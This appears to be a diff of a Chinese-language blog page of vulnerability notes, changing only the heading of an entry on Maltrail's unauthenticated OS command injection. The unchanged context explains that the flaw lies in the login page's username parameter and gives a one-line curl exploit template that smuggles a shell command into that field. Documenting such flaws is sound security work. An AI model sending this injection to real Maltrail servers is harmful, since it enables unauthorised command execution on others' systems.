@@ -923,7 +923,7 @@
 <p><img src="https://s2.loli.net/2023/07/14/81lO3vYJFXcitUm.png" alt="image-20230712153609318"></p>
 </li>
 </ul>
-<h5 id="Maltrail-命令执行漏洞（Unauthenticated-OS-Command-Injection-in-stamparm-x2F-maltrail-vulnerability-found-in-maltrail-huntr-dev-）"><a href="#Maltrail-命令执行漏洞（Unauthenticated-OS-Command-Injection-in-stamparm-x2F-maltrail-vulnerability-found-in-maltrail-huntr-dev-）" class="headerlink" title="Maltrail 命令执行漏洞（Unauthenticated OS Command Injection in stamparm&#x2F;maltrail vulnerability found in maltrail (huntr.dev)）"></a>Maltrail 命令执行漏洞（<a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">Unauthenticated OS Command Injection in stamparm&#x2F;maltrail vulnerability found in maltrail (huntr.dev)</a>）</h5><ul>
+<h5 id="Maltrail-命令执行漏洞（Maltrail）"><a href="#Maltrail-命令执行漏洞（Maltrail）" class="headerlink" title="Maltrail 命令执行漏洞（Maltrail）"></a>Maltrail 命令执行漏洞（<a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">Maltrail</a>）</h5><ul>
 <li><p>链接给出了详细的利用方式，漏洞位于<strong>用户登录页面的username参数</strong>，利用方式如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://hostname:port/login&#x27;  --data &#x27;username=;`OS command`&#x27;</span><br></pre></td></tr></table></figure></li>
 </ul>
